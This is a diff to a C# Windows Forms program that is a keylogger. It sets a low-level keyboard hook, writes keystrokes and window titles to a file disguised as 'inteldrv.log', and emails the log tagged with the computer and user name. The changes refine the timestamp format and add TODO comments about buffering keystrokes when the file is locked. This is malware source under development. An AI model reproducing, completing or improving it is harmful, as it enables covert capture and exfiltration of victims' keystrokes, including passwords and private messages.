@@ -14,7 +14,7 @@ namespace WindowsFormsApplication1
 {
     static class Program
     {
-        public static DateTime timeNow = DateTime.Today;
+        public static DateTime timeNow = DateTime.Now;
         const string logfilename = "inteldrv.log";
 
         private const int WH_KEYBOARD_LL = 13;
@@ -273,7 +273,7 @@ namespace WindowsFormsApplication1
             client.EnableSsl = true;
             Attachment data = new Attachment(Program.path);
             // Set the attachment name as log-computername-username-dateandtime.txt
-            data.Name = "log-" + Environment.MachineName + "-" + Environment.UserName + "-" + Program.timeNow.ToString("yyyyMMdd-HHmm") + ".txt";
+            data.Name = "log-" + Environment.MachineName + "-" + Environment.UserName + "-" + Program.timeNow.ToString("yyyyMMdd-HHmmss") + ".txt";
             msg.Attachments.Add(data);
 
             try
@@ -351,11 +351,23 @@ namespace WindowsFormsApplication1
                 if (windowTitle != null)
                 {
                     Console.WriteLine("{" + windowTitle + "}");
+                    // TODO: Need a try/catch here.
+                    // Try to open the file to append but if unable to save the key to a buffer for adding later.
+                    // The reason the file is unable to be opene is (most likely) because it is already open by
+                    // this process and being read and loaded for the email message.
+                    // Read this page for more insight as to how to implement the temp storage buffer
+                    //      http://stackoverflow.com/questions/469798/konami-code-in-c-sharp
                     StreamWriter wt = File.AppendText(Program.path);
                     wt.WriteLine("{" + windowTitle + "}");
                     wt.Close();
                 }
-                      
+
+                // TODO: Need a try/catch here.
+                // Try to open the file to append but if unable to save the key to a buffer for adding later.
+                // The reason the file is unable to be opene is (most likely) because it is already open by
+                // this process and being read and loaded for the email message.
+                // Read this page for more insight as to how to implement the temp storage buffer
+                //      http://stackoverflow.com/questions/469798/konami-code-in-c-sharp
                 StreamWriter sw = File.AppendText(Program.path);                
                 int vkCode = Marshal.ReadInt32(lParam);
                 if (Keys.Shift == Control.ModifierKeys) Program.shift = 1;
